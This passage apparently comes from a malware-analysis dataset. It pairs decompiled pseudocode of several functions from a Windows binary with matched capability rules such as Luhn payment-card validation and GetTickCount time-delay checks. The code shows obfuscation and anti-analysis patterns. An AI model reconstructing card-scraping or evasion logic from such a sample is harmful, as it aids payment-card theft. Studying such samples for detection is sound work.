= &stack0xfffffe4c;\n        in_stack_fffffe48 = &stack0xfffffe4c;\n        uVar11 = 0x410737;\n        fcn.0040bf30(&stack0xfffffe4c);\n        puVar8 = &stack0xfffffe2c;\n        var_4h_6 = 10;\n        fcn.0040bef0(&stack0xfffffe2c);\n        arg_8h = &fcn.00410560::var_130h_4;\n        var_4h_6._0_1_ = 0xb;\n        iVar2 = fcn.0040bef0(arg_8h);\n        in_stack_fffffe20 = *(iVar2 + 0x10) + 1;\n        var_4h_6 = CONCAT31(var_4h_6._1_3_, 0xd);\n        in_stack_fffffe1c = 0x41077d;\n        fcn.0040fd20(in_stack_fffffe20, arg_8h, puVar8, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, \n                     noname_12, iVar1, arg_8h_00, uVar11, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                     in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, uVar3, \n                     in_stack_fffffe6c, in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, \n                     uVar12, noname_18, noname_19, 0x446fe4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar9, \n                     in_stack_fffffea4, &stack0xfffffe2c, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, \n                     in_stack_fffffeb8, var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, \n                     var_154h_3, in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8\n                     , in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                     stack0xffffff04, in_stack_ffffff08);\n        var_4h_6 = 0xffffffff;\n        if (0xf < _var_154h_2) {\n            fcn.0042ac49();\n        }\n        in_stack_fffffe58 = *0x456244;\n        if (*0x456258 < 0x10) {\n            in_stack_fffffe58 = 0x456244;\n        }\n        in_stack_fffffe5c = 0x447138;\n        uVar4 = 0x4107b8;\n        iVar2 = (**0x469288)();\n        if (iVar2 != 0) {\n            in_stack_fffffea4 = &stack0xfffffe3c;\n            puVar9 = &stack0xfffffe3c;\n            in_stack_fffffe34 = 0x4107d7;\n            fcn.0040bfb0(&stack0xfffffe3c);\n            in_stack_fffffe30 = 0xf;\n            in_stack_fffffe2c = 0;\n            var_4h_6 = 0xe;\n            in_stack_fffffe1c = in_stack_fffffe1c & 0xffffff00;\n            in_stack_fffffe18 = fcn.0042b420();\n            in_stack_fffffe14 = &stack0xfffffee8;\n            noname_9 = 0x410818;\n            fcn.00406270(in_stack_fffffe14, in_stack_fffffe18);\n            puVar13 = &stack0xfffffdf8;\n            uVar7 = 0xffffffff;\n            uVar6 = 0;\n            noname_8 = 0xf;\n            uVar10 = 0;\n            uVar5 = 0x456244;\n            var_4h_6 = CONCAT31(var_4h_6._1_3_, 0xf);\n            in_stack_fffffdf8 = in_stack_fffffdf8 & 0xffffff00;\n            fcn.00406180(0x456244, 0, 0xffffffff);\n            var_4h_6 = 0xffffffff;\n            fcn.0040ff10(uVar5, uVar6, uVar7, in_stack_fffffdf8, in_stack_fffffdfc, in_stack_fffffe00, in_stack_fffffe04\n                         , uVar10, noname_8, noname_9, in_stack_fffffe14, in_stack_fffffe18, in_stack_fffffe1c, \n                         in_stack_fffffe20, arg_8h, puVar8, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, \n                         puVar9, iVar1, arg_8h_00, uVar11, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                         uVar4, in_stack_fffffe58, in_stack_fffffe5c, noname_9_00, noname_10, uVar3, in_stack_fffffe6c, \n                         in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, uVar12, noname_18, \n                         noname_19, 0x446fe4, noname_21, unaff_EDI, unaff_ESI, unaff_EBX, puVar13, in_stack_fffffea4, \n                         &stack0xfffffe1c, in_stack_fffffeac, var_130h_3, in_stack_fffffeb4, in_stack_fffffeb8, \n                         var_158h_2, in_stack_fffffec0, _auStack316, stack0xfffffec8, var_130h_4, var_154h_3, \n                         in_stack_fffffed4, var_158h, var_138h, _var_154h_2, stack0xfffffee4, in_stack_fffffee8, \n                         in_stack_fffffeec, var_114h_3, in_stack_fffffef4, var_11ch_2, var_154h, _var_130h, \n                         stack0xffffff04, in_stack_ffffff08, var_114h_5);\n        }\n        in_stack_fffffe50 = *0x456244;\n        if (*0x456258 < 0x10) {\n            in_stack_fffffe50 = 0x456244;\n        }\n        in_stack_fffffe54 = 0x447138;\n        in_stack_fffffe4c = 0x41086e;\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bf70(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x1a;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bfb0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x1b;\n            fcn.004063b0(uVar12);\n            goto joined_r0x00410c6e;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c030(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x24;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x25;\n            fcn.004063b0(uVar12);\n            goto joined_r0x00410c6e;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040c030(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x2e;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x2f;\n            goto code_r0x00410cc6;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x38;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x39;\n            fcn.004063b0(uVar12);\n            goto joined_r0x00410c6e;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x42;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x43;\n            fcn.004063b0(uVar12);\n            goto joined_r0x00410c6e;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x4c;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x4d;\n            goto code_r0x00410cc6;\n        }\n        iVar1 = (**0x469288)();\n        if (iVar1 != 0) {\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_4);\n            var_4h_6 = 0x4e;\n            fcn.004063b0(uVar12);\n            var_4h_6 = 0xffffffff;\n            if (0xf < _var_154h_2) {\n                fcn.0042ac49();\n            }\n            uVar12 = fcn.0040bff0(&fcn.00410560::var_130h_3);\n            var_4h_6 = 0x4f;\n            fcn.004063b0(uVar12);\n            if (0xf < _auStack316) {\ncode_r0x00410ce0:\n                fcn.0042ac49();\n            }\ncode_r0x00410ce8:\n            *in_FS_OFFSET = iStack16;\n            fcn.0042ad2a(in_stack_fffffe6c);\n            return;\n        }\n        in_stack_fffffe68 = 60000;\n        (**0x4690c8)();\n    } while( true );\n}\n",
        "token_count": 6027
    },
    "00410d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00410f48) overlaps instruction at (ram,0x00410f47)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410d10(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *arg_8h;\n    int32_t extraout_EDX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    ulong uVar5;\n    uint var_a50h;\n    uint var_a2eh;\n    uint var_8e4h;\n    uint var_8d4h;\n    uint var_8d0h;\n    uint var_86ch;\n    uint var_858h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar6;\n    uint uVar7;\n    uint noname_3;\n    uint32_t in_stack_fffff460;\n    uint in_stack_fffff464;\n    uint in_stack_fffff468;\n    uint var_a77h;\n    uint var_a58h;\n    uint var_a54h;\n    uint var_a50h_2;\n    uint var_a4ch;\n    uint var_a48h;\n    uint var_a44h;\n    uint var_a40h;\n    uint var_a3ch;\n    char var_a35h;\n    int32_t var_a34h;\n    uint var_a2ch;\n    uint var_904h;\n    uint32_t var_900h;\n    uint var_8f0h;\n    uint32_t var_8ech;\n    uint32_t var_8e4h_2;\n    uint uStack2264;\n    uint32_t var_8d0h_2;\n    uint32_t var_8c0h;\n    uint var_8b0h;\n    uint32_t var_8ach;\n    uint32_t var_8a4h;\n    uint var_894h;\n    uint32_t var_890h;\n    uint32_t var_888h;\n    uint var_878h;\n    uint32_t var_874h;\n    uint32_t var_86ch_2;\n    uint var_85ch;\n    uint32_t var_858h_2;\n    uint32_t var_850h;\n    uint var_840h;\n    uint32_t var_83ch;\n    uint32_t var_834h;\n    uint var_824h;\n    uint32_t var_820h;\n    uint32_t var_818h;\n    uint var_808h;\n    uint32_t var_804h;\n    uint32_t var_7fch;\n    uint var_7ech;\n    uint32_t var_7e8h;\n    uint var_7e0h_2;\n    uint var_3f8h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint32_t var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43e54c;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    pcVar1 = *0x440014;\n    (**0x440014)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    var_8d0h_2 = 0xf;\n    uStack2264 = 0;\n    var_8e4h_2 = var_8e4h_2 & 0xffffff00;\n    var_4h_2 = 0;\n    fcn.004020d0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.00424df0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x458698 = 44000;\n    *0x4586a4 = 0;\n    *0x458690 = 0;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042acb0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.004202b0(&var_86ch_2);\n    var_4h_2._0_1_ = 1;\n    (**0x469258)();\n    var_4h_2._0_1_ = 0;\n    if (0xf < var_858h_2) {\n        fcn.0042ac49();\n    }\n    fcn.0041ff10(&var_86ch_2);\n    var_4h_2._0_1_ = 2;\n    (**0x469258)();\n    var_4h_2._0_1_ = 0;\n    if (0xf < var_858h_2) {\n        fcn.0042ac49();\n    }\n    fcn.0041fe50(&var_86ch_2);\n    var_4h_2._0_1_ = 3;\n    (**0x469258)();\n    var_4h_2 = var_4h_2._1_3_ << 8;\n    if (0xf < var_858h_2) {\n        fcn.0042ac49();\n    }\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x4586a0 = (**0x4690b8)();\n    while (uVar4 = *0x4586a0 == 0,  !uVar4) {\n        (**0x4690f0)();\n        (**0x4690c8)();\n        *0x4586a0 = (**0x4690b8)();\n    }\n    *0x4586a0 = (**0x469240)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar4) && (uVar4)) {\n    // WARNING: Could not recover jumptable at 0x00410f4c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX + 1))();\n        return;\n    }\n    fcn.00410560();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x45869c = fcn.00428aa0(0, 0x54c5638, 0);\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042acb0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    noname_3 = 0xffffffff;\n    uVar7 = 0;\n    uVar6 = 0x45627c;\n    in_stack_fffff460 = in_stack_fffff460 & 0xffffff00;\n    fcn.00406180(0x45627c, 0, 0xffffffff);\n    uVar5 = fcn.00414d10(&var_7e0h_2, uVar6, uVar7, noname_3, in_stack_fffff460, in_stack_fffff464, in_stack_fffff468);\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    *0x45868c = fcn.0040ac50(uVar5, uVar5 >> 0x20, 0x4453cc);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a34h = 0;\n    fcn.00408bf0(*0x45868c, *0x458454, 1, &var_a34h, &var_a2ch);\n    uVar6 = (**0x4692b4)(0, var_904h);\n    uVar6 = (**0x46923c)(uVar6);\n    fcn.0040af80(*0x45868c, var_a34h, uVar6, var_904h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0041e6a0(uVar6, var_904h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4586e0 != '\\0') {\n        fcn.0040b730();\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4586e4 != 0) {\n        fcn.0040cde0();\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0040de00(*0x45869c);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4586de != '\\0') {\n        fcn.004137b0(*0x45869c);\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0040ece0(*0x458688, *0x45869c);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    if (*0x4586e3 != '\\0') {\n        fcn.00421130(0x46, *0x45869c);\n    }\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    fcn.0042a030(*0x45869c, &var_a40h, &var_a44h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a3ch = 0;\n    var_a34h = 0;\n    fcn.0040b540(&var_a34h, &var_a3ch, var_a40h, var_a44h);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    var_a4ch = var_a34h;\n    var_a48h = var_a3ch;\n    (**0x469290)(0, 0, fcn.0040ce80, &var_a4ch, 0, 0);\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    uVar6 = 7;\n    (*pcVar1)();\n    var_a34h = 0;\n    while (*0x4586ec == 0) {\n        if (*0x4586f0 != 0) goto code_r0x00411377;\n        if (var_a34h == 0x3c) {\n            (**0x469290)(0, 0, fcn.0040ce80, &var_a4ch, 0, 0);\n            var_a34h = 0;\n        }\n        (**0x4690c8)(1000);\n        var_a34h = var_a34h + 1;\n    }\n    do {\n        (**0x4690c8)(1000);\n    } while (*0x4586f4 == 0);\ncode_r0x00411377:\n    (*pcVar1)(1);\n    (*pcVar1)(3);\n    (*pcVar1)(3);\n    (*pcVar1)(7);\n    iVar3 = fcn.00401c90();\n    if ((iVar3 == 0) && (*0x458690 != 0)) {\n        var_83ch = 0xf;\n        var_840h = 0;\n        var_850h = var_850h & 0xffffff00;\n        uVar7 = fcn.0042b420(0x4471e4);\n        fcn.00406270(0x4471e4, uVar7);\n        var_4h_2._0_1_ = 4;\n        var_804h = 0xf;\n        var_808h = 0;\n        var_818h = var_818h & 0xffffff00;\n        uVar7 = fcn.0042b420(0x4471dc);\n        fcn.00406270(0x4471dc, uVar7);\n        var_4h_2._0_1_ = 5;\n        var_7e8h = 0xf;\n        var_7ech = 0;\n        var_7fch = var_7fch & 0xffffff00;\n        uVar7 = fcn.0042b420(0x4471d4);\n        fcn.00406270(0x4471d4, uVar7);\n        var_4h_2._0_1_ = 6;\n        var_820h = 0xf;\n        var_824h = 0;\n        var_834h = var_834h & 0xffffff00;\n        uVar7 = fcn.0042b420(0x4471cc);\n        fcn.00406270(0x4471cc, uVar7);\n        var_4h_2._0_1_ = 7;\n        uVar7 = fcn.004064b0(&var_8c0h, &var_834h, &var_7fch);\n        var_4h_2._0_1_ = 8;\n        uVar7 = fcn.004064b0(&var_8a4h, uVar7, &var_818h);\n        var_4h_2._0_1_ = 9;\n        arg_8h = fcn.004064b0(&var_888h, uVar7, &var_850h);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 10);\n        if (0xf < arg_8h[5]) {\n            arg_8h = *arg_8h;\n        }\n        cVar2 = fcn.004212d0(arg_8h);\n        var_a35h = cVar2 == '\\0';\n        if (0xf < var_874h) {\n            fcn.0042ac49(var_888h);\n        }\n        var_874h = 0xf;\n        var_878h = 0;\n        var_888h = var_888h & 0xffffff00;\n        if (0xf < var_890h) {\n            fcn.0042ac49(var_8a4h);\n        }\n        var_890h = 0xf;\n        var_894h = 0;\n        var_8a4h = var_8a4h & 0xffffff00;\n        if (0xf < var_8ach) {\n            fcn.0042ac49(var_8c0h);\n        }\n        var_8ach = 0xf;\n        var_8b0h = 0;\n        var_8c0h = var_8c0h & 0xffffff00;\n        if (0xf < var_820h) {\n            fcn.0042ac49(var_834h);\n        }\n        var_820h = 0xf;\n        var_824h = 0;\n        var_834h = var_834h & 0xffffff00;\n        if (0xf < var_7e8h) {\n            fcn.0042ac49(var_7fch);\n        }\n        var_7e8h = 0xf;\n        var_7ech = 0;\n        var_7fch = var_7fch & 0xffffff00;\n        if (0xf < var_804h) {\n            fcn.0042ac49(var_818h);\n        }\n        var_804h = 0xf;\n        var_808h = 0;\n        var_818h = var_818h & 0xffffff00;\n        var_4h_2 = var_4h_2 & 0xffffff00;\n        if (0xf < var_83ch) {\n            fcn.0042ac49(var_850h);\n        }\n        if (var_a35h != '\\0') {\n            var_874h = 0xf;\n            var_878h = 0;\n            var_888h = var_888h & 0xffffff00;\n            uVar7 = fcn.0042b420(0x4471c8);\n            fcn.00406270(0x4471c8, uVar7);\n            var_4h_2._0_1_ = 0xb;\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            uVar7 = fcn.0042b420(0x446e5c);\n            fcn.00406270(0x446e5c, uVar7);\n            var_4h_2._0_1_ = 0xc;\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            uVar7 = fcn.0042b420(0x4471c0);\n            fcn.00406270(0x4471c0, uVar7);\n            var_4h_2._0_1_ = 0xd;\n            var_7e8h = 0xf;\n            var_7ech = 0;\n            var_7fch = var_7fch & 0xffffff00;\n            uVar7 = fcn.0042b420(0x446e5c);\n            fcn.00406270(0x446e5c, uVar7);\n            var_4h_2._0_1_ = 0xe;\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            uVar7 = fcn.0042b420(0x4471bc);\n            fcn.00406270(0x4471bc, uVar7);\n            var_4h_2._0_1_ = 0xf;\n            uVar7 = fcn.004064b0(&var_86ch_2, &var_818h, &var_7fch);\n            var_4h_2._0_1_ = 0x10;\n            uVar7 = fcn.004064b0(&var_900h, uVar7, &var_834h);\n            var_4h_2._0_1_ = 0x11;\n            uVar7 = fcn.004064b0(&var_8a4h, uVar7, &var_850h);\n            var_4h_2._0_1_ = 0x12;\n            uVar7 = fcn.004064b0(&var_8c0h, uVar7, &var_888h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x13);\n            fcn.004063b0(uVar7);\n            if (0xf < var_8ach) {\n                fcn.0042ac49(var_8c0h);\n            }\n            var_8ach = 0xf;\n            var_8b0h = 0;\n            var_8c0h = var_8c0h & 0xffffff00;\n            if (0xf < var_890h) {\n                fcn.0042ac49(var_8a4h);\n            }\n            var_890h = 0xf;\n            var_894h = 0;\n            var_8a4h = var_8a4h & 0xffffff00;\n            if (0xf < var_8ech) {\n                fcn.0042ac49(var_900h);\n            }\n            var_8ech = 0xf;\n            var_8f0h = 0;\n            var_900h = var_900h & 0xffffff00;\n            if (0xf < var_858h_2) {\n                fcn.0042ac49(var_86ch_2);\n            }\n            var_858h_2 = 0xf;\n            var_85ch = 0;\n            var_86ch_2 = var_86ch_2 & 0xffffff00;\n            if (0xf < var_804h) {\n                fcn.0042ac49(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_7e8h) {\n                fcn.0042ac49(var_7fch);\n            }\n            var_7e8h = 0xf;\n            var_7ech = 0;\n            var_7fch = var_7fch & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042ac49(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_83ch) {\n                fcn.0042ac49(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            var_4h_2 = var_4h_2 & 0xffffff00;\n            if (0xf < var_874h) {\n                fcn.0042ac49(var_888h);\n            }\n            (**0x469290)(0, 0, fcn.0040ce80, &var_a4ch, 0, 0);\n            (**0x4690c8)(60000);\n        }\n    }\n    fcn.0042acb0(0x45869c, 0, 4);\n    fcn.00423fc0();\n    fcn.0042acb0(0x4586a0, 0, 4);\n    if (0xf < var_8d0h_2) {\n        fcn.0042ac49(var_8e4h_2);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(uVar6);\n    return;\n}\n",
        "token_count": 5266
    },
    "00411960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004119e1) overlaps instruction at (ram,0x004119e0)\n// \n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00411960(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    int32_t extraout_EDX_09;\n    int32_t extraout_EDX_10;\n    int32_t extraout_EDX_11;\n    int32_t extraout_EDX_12;\n    int32_t extraout_EDX_13;\n    int32_t extraout_EDX_14;\n    int32_t extraout_EDX_15;\n    int32_t extraout_EDX_16;\n    int32_t extraout_EDX_17;\n    int32_t extraout_EDX_18;\n    int32_t extraout_EDX_19;\n    int32_t extraout_EDX_20;\n    int32_t extraout_EDX_21;\n    int32_t extraout_EDX_22;\n    int32_t extraout_EDX_23;\n    int32_t extraout_EDX_24;\n    int32_t extraout_EDX_25;\n    uchar uVar2;\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.0042ae40();\n    pcVar1 = *0x440014;\n    (**0x440014)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042acb0();\n    uVar2 = *0x10 == 0x2c;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004119e5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411a13. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_00 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411a41. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_01 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0xbc;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411b98. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_02 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411bc6. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_03 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411bf4. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_04 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.00401f10();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0x14c;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d32. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_05 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d60. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_06 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    